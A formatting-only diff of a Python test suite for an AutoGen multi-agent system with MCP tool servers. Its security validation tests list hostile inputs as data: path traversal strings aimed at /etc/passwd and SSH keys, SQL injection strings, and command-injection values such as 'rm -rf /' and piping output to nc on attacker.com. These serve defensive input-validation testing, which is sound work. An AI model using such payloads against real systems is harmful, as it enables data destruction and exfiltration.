@@ -38,6 +38,7 @@ from src.exceptions import *
 # TEST 1: MCP Server Testing
 # =============================================================================
 
+
 class TestMCPServers:
     """White-box testing for all MCP servers"""
 
@@ -50,27 +51,27 @@ class TestMCPServers:
                     "enabled": True,
                     "port": 3000,
                     "server_url": "http://localhost:3000",
-                    "timeout": 30
+                    "timeout": 30,
                 },
                 "filesystem": {
                     "enabled": True,
                     "port": 3001,
                     "server_url": "http://localhost:3001",
                     "timeout": 10,
-                    "allowed_paths": ["./workspace", "./test_data"]
+                    "allowed_paths": ["./workspace", "./test_data"],
                 },
                 "memory": {
                     "enabled": True,
                     "port": 3002,
                     "server_url": "http://localhost:3002",
-                    "timeout": 5
+                    "timeout": 5,
                 },
                 "codebasebuddy": {
                     "enabled": True,
                     "port": 3004,
                     "server_url": "http://localhost:3004",
-                    "timeout": 60
-                }
+                    "timeout": 60,
+                },
             }
         }
 
@@ -95,21 +96,21 @@ class TestMCPServers:
         """Test GitHub MCP server operations"""
         from src.mcp.github_tool import GitHubMCPTool
 
-        config = {
-            "server_url": "http://localhost:3000",
-            "auth_token": "test_token",
-            "timeout": 30
-        }
+        config = {"server_url": "http://localhost:3000", "auth_token": "test_token", "timeout": 30}
 
         github_tool = GitHubMCPTool(server_url=config["server_url"], config=config)
 
         # Test available operations
-        assert hasattr(github_tool, 'execute')
+        assert hasattr(github_tool, "execute")
 
         # Test operation validation
         operations = [
-            "create_pr", "get_pr", "create_issue", "search_code",
-            "get_file_contents", "get_commit"
+            "create_pr",
+            "get_pr",
+            "create_issue",
+            "search_code",
+            "get_file_contents",
+            "get_commit",
         ]
         for op in operations:
             assert op  # Operations should be defined
@@ -123,7 +124,7 @@ class TestMCPServers:
             "server_url": "http://localhost:3001",
             "allowed_paths": ["./workspace", "./test_data"],
             "blocked_patterns": [r"\.\.\/", r"\/etc\/", r"\.ssh\/"],
-            "timeout": 10
+            "timeout": 10,
         }
 
         fs_tool = FilesystemMCPTool(server_url=config["server_url"], config=config)
@@ -141,7 +142,7 @@ class TestMCPServers:
             "server_url": "http://localhost:3002",
             "storage_backend": "sqlite",
             "sqlite_path": "./data/test_memory.db",
-            "timeout": 5
+            "timeout": 5,
         }
 
         memory_tool = MemoryMCPTool(server_url=config["server_url"], config=config)
@@ -160,15 +161,18 @@ class TestMCPServers:
             "server_url": "http://localhost:3004",
             "index_path": "./data/test_codebase_index",
             "embedding_model": "all-MiniLM-L6-v2",
-            "timeout": 60
+            "timeout": 60,
         }
 
         buddy_tool = CodeBaseBuddyMCPTool(server_url=config["server_url"], config=config)
 
         # Test semantic search operations
         operations = [
-            "semantic_search", "find_similar_code", "get_code_context",
-            "build_index", "find_usages"
+            "semantic_search",
+            "find_similar_code",
+            "get_code_context",
+            "build_index",
+            "find_usages",
         ]
         for op in operations:
             assert op  # Operations should be defined
@@ -177,6 +181,7 @@ class TestMCPServers:
 # =============================================================================
 # TEST 2: Agent Testing
 # =============================================================================
+
 
 class TestAgents:
     """White-box testing for all 8 agents"""
@@ -193,9 +198,14 @@ class TestAgents:
 
         # Verify all agents are defined in config
         expected_agents = [
-            "code_analyzer", "security_auditor", "documentation_agent",
-            "deployment_agent", "research_agent", "project_manager",
-            "executor", "user_proxy_executor"
+            "code_analyzer",
+            "security_auditor",
+            "documentation_agent",
+            "deployment_agent",
+            "research_agent",
+            "project_manager",
+            "executor",
+            "user_proxy_executor",
         ]
 
         for agent_name in expected_agents:
@@ -278,7 +288,7 @@ class TestAgents:
 
     def test_create_all_agents(self, agent_factory):
         """Test creating all agents at once"""
-        with patch.object(agent_factory, 'create_agent') as mock_create:
+        with patch.object(agent_factory, "create_agent") as mock_create:
             mock_create.return_value = Mock()
             agent_factory.create_all_agents()
 
@@ -290,14 +300,15 @@ class TestAgents:
 # TEST 3: Workflow Testing
 # =============================================================================
 
+
 class TestWorkflows:
     """White-box testing for all workflows"""
 
     @pytest.fixture
     def conversation_manager(self):
         """Create conversation manager for testing"""
-        with patch('src.autogen_adapters.conversation_manager.AutoGenAgentFactory'):
-            with patch('src.autogen_adapters.conversation_manager.FunctionRegistry'):
+        with patch("src.autogen_adapters.conversation_manager.AutoGenAgentFactory"):
+            with patch("src.autogen_adapters.conversation_manager.FunctionRegistry"):
                 manager = ConversationManager()
                 return manager
 
@@ -306,9 +317,14 @@ class TestWorkflows:
         workflows = conversation_manager.workflow_configs
 
         expected_workflows = [
-            "code_analysis", "security_audit", "documentation_generation",
-            "deployment", "research", "quick_code_review",
-            "quick_documentation", "comprehensive_feature_review"
+            "code_analysis",
+            "security_audit",
+            "documentation_generation",
+            "deployment",
+            "research",
+            "quick_code_review",
+            "quick_documentation",
+            "comprehensive_feature_review",
         ]
 
         for workflow in expected_workflows:
@@ -377,6 +393,7 @@ class TestWorkflows:
 # TEST 4: Security Validation Testing
 # =============================================================================
 
+
 class TestSecurityValidation:
     """White-box testing for security validation"""
 
@@ -391,7 +408,7 @@ class TestSecurityValidation:
             "../../../etc/passwd",
             "..\\..\\windows\\system32",
             "workspace/../../../secrets",
-            "./data/../../.ssh/id_rsa"
+            "./data/../../.ssh/id_rsa",
         ]
 
         for path in malicious_paths:
@@ -404,7 +421,7 @@ class TestSecurityValidation:
             "'; DROP TABLE users; --",
             "1' OR '1'='1",
             "admin'--",
-            "1 UNION SELECT * FROM passwords"
+            "1 UNION SELECT * FROM passwords",
         ]
 
         for sql_input in malicious_inputs:
@@ -417,7 +434,7 @@ class TestSecurityValidation:
             "file.txt; rm -rf /",
             "data.csv && cat /etc/passwd",
             "output.log | nc attacker.com 1234",
-            "test.sh `whoami`"
+            "test.sh `whoami`",
         ]
 
         for cmd in malicious_commands:
@@ -427,32 +444,21 @@ class TestSecurityValidation:
     def test_mcp_tool_parameter_validation(self, input_validator):
         """Test MCP tool parameter validation"""
         # Valid parameters
-        valid_params = {
-            "owner": "myorg",
-            "repo": "myrepo",
-            "title": "Fix bug",
-            "pr_number": "123"
-        }
+        valid_params = {"owner": "myorg", "repo": "myrepo", "title": "Fix bug", "pr_number": "123"}
 
-        validated = input_validator.validate_mcp_tool_params(
-            "github", "create_pr", valid_params
-        )
+        validated = input_validator.validate_mcp_tool_params("github", "create_pr", valid_params)
         assert validated is not None
         assert validated["owner"] == "myorg"
 
     def test_invalid_tool_name_rejection(self, input_validator):
         """Test invalid tool names are rejected"""
         with pytest.raises(ValidationError):
-            input_validator.validate_mcp_tool_params(
-                "malicious_tool", "operation", {}
-            )
+            input_validator.validate_mcp_tool_params("malicious_tool", "operation", {})
 
     def test_invalid_operation_name_rejection(self, input_validator):
         """Test invalid operation names are rejected"""
         with pytest.raises(ValidationError):
-            input_validator.validate_mcp_tool_params(
-                "github", "DROP_TABLE", {}
-            )
+            input_validator.validate_mcp_tool_params("github", "DROP_TABLE", {})
 
     def test_workflow_parameter_validation(self, input_validator):
         """Test workflow parameter validation"""
@@ -460,7 +466,7 @@ class TestSecurityValidation:
             "code_path": "./src/main.py",
             "focus_areas": "security, performance",
             "scope": "full",
-            "environment": "production"
+            "environment": "production",
         }
 
         validated = input_validator.validate_parameters(valid_params)
@@ -489,16 +495,13 @@ class TestSecurityValidation:
 # TEST 5: Exception Hierarchy Testing
 # =============================================================================
 
+
 class TestExceptionHierarchy:
     """White-box testing for standardized exception hierarchy"""
 
     def test_base_exception_attributes(self):
         """Test base exception has all required attributes"""
-        error = AutoGenAssistantError(
-            "Test error",
-            error_code="TEST_001",
-            details={"key": "value"}
-        )
+        error = AutoGenAssistantError("Test error", error_code="TEST_001", details={"key": "value"})
 
         assert error.message == "Test error"
         assert error.error_code == "TEST_001"
@@ -507,9 +510,7 @@ class TestExceptionHierarchy:
     def test_exception_to_dict(self):
         """Test exception can be serialized to dict"""
         error = AutoGenAssistantError(
-            "Test error",
-            error_code="TEST_001",
-            details={"component": "test"}
+            "Test error", error_code="TEST_001", details={"component": "test"}
         )
 
         error_dict = error.to_dict()
@@ -523,7 +524,7 @@ class TestExceptionHierarchy:
         errors = [
             InvalidConfigError("Invalid config"),
             MissingConfigError("Missing config"),
-            ConfigValidationError("Validation failed")
+            ConfigValidationError("Validation failed"),
         ]
 
         for error in errors:
@@ -535,7 +536,7 @@ class TestExceptionHierarchy:
         errors = [
             AgentNotFoundError("Agent not found"),
             AgentInitializationError("Init failed"),
-            AgentExecutionError("Execution failed")
+            AgentExecutionError("Execution failed"),
         ]
 
         for error in errors:
@@ -548,7 +549,7 @@ class TestExceptionHierarchy:
             MCPConnectionError("Connection failed"),
             MCPTimeoutError("Timeout"),
             MCPAuthenticationError("Auth failed"),
-            MCPOperationError("Operation failed")
+            MCPOperationError("Operation failed"),
         ]
 
         for error in errors:
@@ -563,7 +564,7 @@ class TestExceptionHierarchy:
             AuthorizationError("Not authorized"),
             RateLimitError("Rate limit exceeded"),
             PathTraversalError("Path traversal"),
-            InjectionError("Injection detected")
+            InjectionError("Injection detected"),
         ]
 
         for error in errors:
@@ -574,6 +575,7 @@ class TestExceptionHierarchy:
 # =============================================================================
 # TEST 6: Function Registry Testing
 # =============================================================================
+
 
 class TestFunctionRegistry:
     """White-box testing for function registry"""
@@ -594,7 +596,7 @@ class TestFunctionRegistry:
             "github_operations",
             "filesystem_operations",
             "memory_operations",
-            "codebasebuddy_operations"
+            "codebasebuddy_operations",
         ]
 
         for tool in expected_tools:
@@ -608,8 +610,11 @@ class TestFunctionRegistry:
         functions = github_config.get("functions", {})
 
         expected_functions = [
-            "create_pull_request", "get_pull_request", "create_issue",
-            "search_code", "get_file_contents"
+            "create_pull_request",
+            "get_pull_request",
+            "create_issue",
+            "search_code",
+            "get_file_contents",
         ]
 
         for func in expected_functions:
@@ -622,9 +627,7 @@ class TestFunctionRegistry:
         assert fs_config is not None
         functions = fs_config.get("functions", {})
 
-        expected_functions = [
-            "read_file", "write_file", "list_directory", "search_files"
-        ]
+        expected_functions = ["read_file", "write_file", "list_directory", "search_files"]
 
         for func in expected_functions:
             assert func in functions
@@ -636,9 +639,7 @@ class TestFunctionRegistry:
         assert memory_config is not None
         functions = memory_config.get("functions", {})
 
-        expected_functions = [
-            "store_memory", "retrieve_memory", "search_memory"
-        ]
+        expected_functions = ["store_memory", "retrieve_memory", "search_memory"]
 
         for func in expected_functions:
             assert func in functions
@@ -651,8 +652,11 @@ class TestFunctionRegistry:
         functions = buddy_config.get("functions", {})
 
         expected_functions = [
-            "semantic_code_search", "find_similar_code", "get_code_context",
-            "build_code_index", "find_code_usages"
+            "semantic_code_search",
+            "find_similar_code",
+            "get_code_context",
+            "build_code_index",
+            "find_code_usages",
         ]
 
         for func in expected_functions:
@@ -662,6 +666,7 @@ class TestFunctionRegistry:
 # =============================================================================
 # TEST 7: Configuration Loading Testing
 # =============================================================================
+
 
 class TestConfigurationLoading:
     """White-box testing for configuration loading"""
@@ -731,6 +736,7 @@ class TestConfigurationLoading:
 # TEST 8: Rate Limiting and Circuit Breaker Testing
 # =============================================================================
 
+
 class TestRateLimitingAndCircuitBreaker:
     """White-box testing for rate limiting and circuit breakers"""
 
@@ -751,11 +757,7 @@ class TestRateLimitingAndCircuitBreaker:
         """Test rate limiter integrated with MCP tools"""
         from src.security.rate_limiter import RateLimiter
 
-        limiter = RateLimiter(
-            requests_per_minute=60,
-            requests_per_hour=1000,
-            burst_size=10
-        )
+        limiter = RateLimiter(requests_per_minute=60, requests_per_hour=1000, burst_size=10)
 
         # Should allow requests within limits
         for i in range(10):
@@ -766,9 +768,7 @@ class TestRateLimitingAndCircuitBreaker:
         from src.security.circuit_breaker import CircuitBreaker
 
         breaker = CircuitBreaker(
-            failure_threshold=5,
-            recovery_timeout=10,
-            expected_exception=Exception
+            failure_threshold=5, recovery_timeout=10, expected_exception=Exception
         )
 
         # Should start in CLOSED state
@@ -778,6 +778,7 @@ class TestRateLimitingAndCircuitBreaker:
 # =============================================================================
 # TEST 9: Memory System Testing
 # =============================================================================
+
 
 class TestMemorySystem:
     """White-box testing for memory system"""
@@ -820,13 +821,14 @@ class TestMemorySystem:
 # TEST 10: Integration Testing
 # =============================================================================
 
+
 class TestIntegration:
     """White-box integration testing"""
 
     @pytest.mark.asyncio
     async def test_agent_to_mcp_integration(self):
         """Test agent can access MCP tools"""
-        with patch('src.autogen_adapters.agent_factory.AutoGenAgentFactory.create_agent'):
+        with patch("src.autogen_adapters.agent_factory.AutoGenAgentFactory.create_agent"):
             factory = AutoGenAgentFactory()
 
             # Verify agent-to-tool mapping exists
@@ -843,6 +845,7 @@ class TestIntegration:
 
         # Verify validator is accessible
         from src.security.input_validator import validator
+
         assert validator is not None
 
     def test_exception_handling_integration(self):
